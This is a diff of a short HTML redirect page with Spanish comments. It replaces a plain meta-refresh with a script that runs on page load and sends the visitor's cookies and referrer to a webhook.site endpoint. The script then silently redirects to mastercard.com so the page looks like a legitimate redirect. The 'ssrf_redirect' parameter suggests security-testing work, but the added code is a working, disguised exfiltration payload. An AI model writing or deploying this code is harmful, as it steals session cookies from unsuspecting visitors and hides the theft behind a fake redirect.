@@ -1,11 +1,23 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta http-equiv="refresh" content="0; url=https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?via=redirect">
-    <title>Redirigiendo...</title>
-  </head>
-  <body>
-    Redirigiendo a destino externo...
-  </body>
+<head>
+  <title>Redirecting...</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <script>
+    // Cambiar a tu URL de Webhook real
+    const exfilURL = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";
+
+    // Exfiltrar información básica
+    fetch(`${exfilURL}?ssrf_redirect=1&referrer=${encodeURIComponent(document.referrer)}&cookies=${encodeURIComponent(document.cookie)}`);
+
+    // Redirigir silenciosamente después de 1 segundo
+    setTimeout(() => {
+      window.location.href = "https://www.mastercard.com"; // redirección legítima simulada
+    }, 1000);
+  </script>
+  <p>Redireccionando... espere un momento.</p>
+</body>
 </html>
 
